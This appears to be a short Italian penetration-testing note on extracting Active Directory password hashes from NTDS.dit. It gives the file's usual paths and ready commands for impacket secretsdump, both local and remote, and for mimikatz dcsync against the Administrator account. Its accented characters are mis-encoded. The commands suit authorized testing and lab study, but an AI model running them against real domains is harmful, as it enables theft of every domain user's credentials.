#Privesc_AD 

---
#### INDICE

- [[#Introduzione]]
- [[#Estrazione NTDS.dit]]
- [[#Estrazione in remoto]]

---
---
---
### Introduzione
L'estrazione password daÂ **NTDS.dit**Â Ã¨ una tecnica avanzata che permette di ottenere gli hash NTLM di tutti gli utenti di dominio. Il file NTDS.dit Ã¨ il database di Active Directory che contiene tutte le informazioni critiche del dominio, inclusi gli hash password.

I percorsi piÃ¹ comuni sono:
- `C:\Windows\NTDS\NTDS.dit`
- `C:\Windows\System32\config\NTDS.dit`

---
### Estrazione NTDS.dit
Tramite l'aiuto di [impacket](https://github.com/fortra/impacket?tab=readme-ov-file#getting-impacket):

```
# Linux
python3 secretsdump.py -ntds ntds.dit -system system.hive -just-dc-user <USERNAME> LOCAL

# Windows
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---
### Estrazione in remoto

```
impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_DOMAIN>' -dc-ip <IP_DC>
```

**NB:** inserire in `/etc/hosts` l'IP del Domain Controller `<IP_DC>`

ðŸ“šâ€‹ Writeups:
- *Network:*[[Network#Secura | Secura]],